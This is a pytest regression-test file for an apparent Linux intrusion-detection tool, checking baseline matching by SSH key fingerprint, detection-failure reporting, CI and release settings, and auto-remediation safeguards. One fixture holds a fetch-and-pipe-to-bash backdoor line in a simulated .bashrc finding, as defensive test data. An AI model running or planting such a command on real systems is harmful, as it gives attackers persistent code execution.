"""Regression tests for the 2.3.0 bridge release.

N-01: a detection-stage failure must never read as a clean host.
N-14: baselines must not be keyed on text an attacker chooses.
"""
import base64
import hashlib
import warnings
from unittest.mock import patch

import pytest
from click.testing import CliRunner

from ubuntils import cli
from ubuntils.collectors.source import LiveSource
from ubuntils.detectors.finding import Finding, Severity
from ubuntils.pipeline import run_scan
from ubuntils.utils.baseline import Baseline, load_baseline
from ubuntils.utils.config import Allowlist


class _ExplodingBaseline(Baseline):
    def filter(self, findings):
        raise RuntimeError("baseline exploded")


class _ExplodingAllowlist(Allowlist):
    def filter(self, findings):
        raise RuntimeError("allowlist exploded")


def _scan(**kwargs):
    with patch("ubuntils.pipeline.ALL_COLLECTORS", []), \
            patch("ubuntils.pipeline.TimelineBuilder") as tl:
        tl.return_value.build.return_value = []
        return run_scan(LiveSource(), forward_wazuh=False, **kwargs)


# ── N-01 ─────────────────────────────────────────────────────────────────────

def test_N01_baseline_filter_crash_is_reported_not_clean():
    r = _scan(baseline=_ExplodingBaseline())
    assert r.findings == []
    assert "DetectionEngine" in r.scan_metadata["rules_failed"]
    assert "baseline exploded" in r.scan_metadata["detection_error"]
    assert r.stats["detection_error"] == r.scan_metadata["detection_error"]


def test_N01_allowlist_filter_crash_is_reported_not_clean():
    r = _scan(allowlist=_ExplodingAllowlist())
    assert "DetectionEngine" in r.scan_metadata["rules_failed"]
    assert "allowlist exploded" in r.scan_metadata["detection_error"]


def test_N01_healthy_scan_has_no_detection_error():
    r = _scan()
    assert r.scan_metadata["detection_error"] is None
    assert "DetectionEngine" not in r.scan_metadata["rules_failed"]


def test_N01_tui_summary_does_not_say_clean():
    from ubuntils.tui.summary_screen import _build_summary
    r = _scan(baseline=_ExplodingBaseline())
    text = _build_summary(r.findings, r.timeline, r.stats)
    assert "appears clean" not in text
    assert "Detection failed" in text


def test_N01_cli_json_exits_nonzero(monkeypatch, tmp_path):
    monkeypatch.setattr(cli, "_ensure_root", lambda: None)
    monkeypatch.setattr(cli, "load_baseline", lambda path: _ExplodingBaseline())
    baseline = tmp_path / "b.yaml"
    baseline.write_text("baseline: []\n")
    with patch("ubuntils.pipeline.ALL_COLLECTORS", []), \
            patch("ubuntils.pipeline.TimelineBuilder") as tl:
        tl.return_value.build.return_value = []
        result = CliRunner().invoke(
            cli.main, ["scan", "--json", "--no-wazuh", "--baseline", str(baseline)])
    assert result.exit_code == cli.EXIT_DETECTION_FAILED
    assert '"detection_error"' in result.output


# ── N-14 ─────────────────────────────────────────────────────────────────────

_ADMIN_KEY = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519admin-key-blob").decode()
_ATTACKER_KEY = base64.b64encode(b"\x00\x00\x00\x0bssh-ed25519attacker-blob").decode()


def _key_finding(key_data, comment="ci@ci-runner", options="", signals=None):
    line = " ".join(filter(None, [options, "ssh-ed25519", key_data, comment]))
    return Finding(
        rule_id="SSH_UNAUTHORIZED_KEY", severity=Severity.MEDIUM, title="t", description="d",
        artifact_path="/home/ci/.ssh/authorized_keys", raw_value=line,
        remediation_available=True, signals=signals or [],
    )


def _sha256_fp(key_data):
    blob = base64.b64decode(key_data)
    return "SHA256:" + base64.b64encode(hashlib.sha256(blob).digest()).decode().rstrip("=")


def test_N14_attacker_key_with_baselined_comment_is_not_suppressed():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": "ci@ci-runner"}])
    assert not b.matches(_key_finding(_ATTACKER_KEY))


def test_N14_baselined_text_in_key_options_is_not_matched():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": "known-good"}])
    f = _key_finding(_ATTACKER_KEY, comment="x", options='environment="X=known-good"')
    assert not b.matches(f)


def test_N14_key_matches_by_sha256_fingerprint():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY",
                           "fingerprint": _sha256_fp(_ADMIN_KEY)}])
    assert b.matches(_key_finding(_ADMIN_KEY))
    assert not b.matches(_key_finding(_ATTACKER_KEY))


def test_N14_key_matches_by_key_data():
    b = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": _ADMIN_KEY}])
    assert b.matches(_key_finding(_ADMIN_KEY, comment="anything"))
    assert not b.matches(_key_finding(_ATTACKER_KEY))


def test_N14_path_entry_does_not_hide_new_download_and_execute_line():
    b = Baseline(entries=[{"rule_id": "SHELL_RC_MODIFICATION",
                           "fingerprint": "/home/deploy/.bashrc"}])
    churn = Finding(rule_id="SHELL_RC_MODIFICATION", severity=Severity.LOW, title="t",
                    description="d", artifact_path="/home/deploy/.bashrc",
                    raw_value="/home/deploy/.bashrc", remediation_available=False)
    backdoor = Finding(rule_id="SHELL_RC_MODIFICATION", severity=Severity.MEDIUM, title="t",
                       description="d", artifact_path="/home/deploy/.bashrc",
                       raw_value="curl http://x.invalid/s | bash", remediation_available=False,
                       signals=[{"name": "content_match", "weight": 30, "detail": "d"}])
    assert b.matches(churn)
    assert not b.matches(backdoor)


def test_N14_v1_baseline_warns_about_3_0(tmp_path):
    p = tmp_path / "b.yaml"
    p.write_text("baseline:\n  - rule_id: USER_UID_ZERO\n    fingerprint: ghost\n")
    with warnings.catch_warnings(record=True) as caught:
        warnings.simplefilter("always")
        load_baseline(str(p))
    assert any(issubclass(w.category, FutureWarning) and "3.0" in str(w.message)
               for w in caught)


def test_N14_unknown_baseline_version_is_refused(tmp_path):
    p = tmp_path / "b.yaml"
    p.write_text("version: 2\nbaseline: []\n")
    with pytest.raises(ValueError, match="version 2"):
        load_baseline(str(p))


# ── N-05: CI tests the pins users install ────────────────────────────────────

import os  # noqa: E402
import re  # noqa: E402

_REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def _pins(path):
    text = open(os.path.join(_REPO, path)).read()
    return {m.group(1).lower(): m.group(2)
            for m in re.finditer(r"^([A-Za-z0-9_.-]+)(?:\[[^\]]*\])?==(\S+)", text, re.M)}


def test_N05_ci_installs_the_hash_pinned_dev_lock():
    ci = open(os.path.join(_REPO, ".github", "workflows", "ci.yml")).read()
    assert "pip install --require-hashes -r requirements-dev.lock" in ci
    assert "pip-audit --require-hashes --disable-pip -r requirements-dev.lock" in ci


def test_N05_dev_lock_uses_exactly_the_runtime_pins():
    runtime, dev = _pins("requirements.lock"), _pins("requirements-dev.lock")
    assert runtime
    for name, version in runtime.items():
        assert dev.get(name) == version, f"{name}: runtime {version}, dev {dev.get(name)}"


# ── N-10: release workflow permissions and checksums ─────────────────────────

def test_N10_release_workflow_grants_nothing_by_default_and_publishes_sums():
    import yaml
    wf = yaml.safe_load(open(os.path.join(_REPO, ".github", "workflows", "release.yml")))
    assert wf["permissions"] == {}
    for name, job in wf["jobs"].items():
        assert "permissions" in job, f"job {name} has no explicit permissions"
    text = open(os.path.join(_REPO, ".github", "workflows", "release.yml")).read()
    assert "sha256sum" in text and "SHA256SUMS" in text


# ── N-03 / N-06: docs that drifted from the code ─────────────────────────────

def _doc(path):
    return open(os.path.join(_REPO, path)).read()


def test_N06_rule_count_badge_matches_the_engine():
    from ubuntils.detectors.engine import ALL_RULES
    assert f"detection%20rules-{len(ALL_RULES)}-" in _doc("README.md")


def test_N06_no_static_test_or_coverage_badges():
    readme = _doc("README.md")
    assert "badge/tests-" not in readme and "badge/coverage-" not in readme


def test_N06_docs_never_suggest_cp_for_rollback():
    for path in ("docs/debugging-common-issues.md", "CONTRIBUTING.md"):
        text = _doc(path)
        assert "ubuntils rollback" in text, path
        assert "(a `cp` of the backup" not in text, path


def test_N03_ubuntu_20_04_is_not_claimed():
    readme = _doc("README.md")
    compat = readme.split("## Compatibility", 1)[1].split("\n---", 1)[0]
    assert "| **Ubuntu** | 22.04, 24.04, 26.04 |" in compat
    assert "20.04%20%7C" not in readme


# ── R0-5: deprecation notices ────────────────────────────────────────────────

@pytest.mark.real_deprecation_notices
def test_R05_python_3_9_gets_a_deprecation_notice(monkeypatch):
    monkeypatch.setattr(cli.sys, "version_info", (3, 9, 18, "final", 0))
    assert any("3.10" in n for n in cli._deprecation_notices())


@pytest.mark.real_deprecation_notices
def test_R05_supported_python_gets_no_notice():
    import sys
    if sys.version_info >= (3, 10):
        assert cli._deprecation_notices() == []


def test_R05_notice_is_printed_once_on_stderr(monkeypatch, split_runner):
    monkeypatch.setattr(cli, "_deprecation_notices", lambda: ["going away"])
    result = split_runner.invoke(cli.main, ["version"])
    assert result.exit_code == 0
    assert result.stderr.count("deprecation: going away") == 1
    assert "going away" not in result.stdout


def test_R05_help_mentions_the_tui_extra():
    assert "ubuntils[tui]" in CliRunner().invoke(cli.main, ["--help"]).output


# ── N-15: --remediate --confirm must not lock out a new host's admin ─────────
# On a stock Ubuntu cloud image in its first week, the default user's only
# SSH key scored 70 on recency alone and its cloud-init NOPASSWD rule 50, so
# `scan --remediate --confirm` removed both; that user's password is locked,
# which left nobody able to log in or use sudo.

import time as _time  # noqa: E402

from ubuntils.detectors.finding import RECENCY_ONLY, SOLE_SUDO_ACCESS  # noqa: E402
from ubuntils.detectors.rules import (  # noqa: E402
    rule_ssh_unauthorized_key, rule_sudoers_nopasswd,
)
from ubuntils.formatters.json_formatter import JSONFormatter  # noqa: E402
from ubuntils.pipeline import remediate_findings  # noqa: E402
from ubuntils.detectors.finding import RemediationStatus  # noqa: E402


def _admin_key(options=""):
    now = _time.time() - 2 * 86400
    line = " ".join(filter(None, [options, "ssh-ed25519", _ADMIN_KEY, "admin@laptop"]))
    return {"username": "ubuntu", "home": "/home/ubuntu",
            "path": "/home/ubuntu/.ssh/authorized_keys", "key_type": "ssh-ed25519",
            "key_data": _ADMIN_KEY, "comment": "admin@laptop", "options": options,
            "raw_line": line, "file_mtime": now, "file_ctime": now}


def _cloud_user(password_locked=True):
    return {"username": "ubuntu", "uid": 1000, "gid": 1000, "home": "/home/ubuntu",
            "shell": "/bin/bash", "is_login_shell": True, "groups": ["sudo"],
            "password_locked": password_locked, "password_empty": False}


def _cloud_init_rule():
    return {"source": "/etc/sudoers.d/90-cloud-init-users", "user": "ubuntu",
            "principals": ["ubuntu"], "options": "NOPASSWD:", "commands": "ALL",
            "raw_line": "ubuntu ALL=(ALL) NOPASSWD:ALL"}


def test_N15_new_hosts_only_key_is_never_auto_removed():
    [f] = rule_ssh_unauthorized_key({"authorized_keys": [_admin_key()]})
    assert f.confidence >= 40  # above the gate: the score alone would remove it
    assert [r.code for r in f.blocked_reasons] == [RECENCY_ONLY]
    [result] = remediate_findings([f], confirm=True, min_confidence=0)
    assert result.status == RemediationStatus.SKIPPED
    assert "RECENCY_ONLY" in result.message


def test_N15_key_with_content_evidence_stays_eligible():
    [f] = rule_ssh_unauthorized_key({"authorized_keys": [_admin_key('command="/tmp/.x"')]})
    assert f.blocked_reasons == []


def test_N15_cloud_init_sudo_rule_for_a_locked_user_is_never_auto_removed():
    [f] = rule_sudoers_nopasswd({"users": [_cloud_user()],
                                 "sudoers_rules": [_cloud_init_rule()]})
    assert f.remediation_available  # still fixable by hand, after review
    assert [r.code for r in f.blocked_reasons] == [SOLE_SUDO_ACCESS]
    [result] = remediate_findings([f], confirm=True, min_confidence=0)
    assert result.status == RemediationStatus.SKIPPED


def test_N15_unknown_password_state_also_blocks():
    [f] = rule_sudoers_nopasswd({"users": [_cloud_user(password_locked=None)],
                                 "sudoers_rules": [_cloud_init_rule()]})
    assert [r.code for r in f.blocked_reasons] == [SOLE_SUDO_ACCESS]


def test_N15_user_with_a_password_stays_eligible():
    [f] = rule_sudoers_nopasswd({"users": [_cloud_user(password_locked=False)],
                                 "sudoers_rules": [_cloud_init_rule()]})
    assert f.blocked_reasons == []


def test_N15_report_lists_every_block_reason():
    [f] = rule_sudoers_nopasswd({"users": [_cloud_user()],
                                 "sudoers_rules": [_cloud_init_rule()]})
    d = JSONFormatter()._finding(f)
    assert d["blocked_reasons"][0]["code"] == SOLE_SUDO_ACCESS
    assert d["auto_remediation_blocked"] == d["blocked_reasons"][0]["detail"]
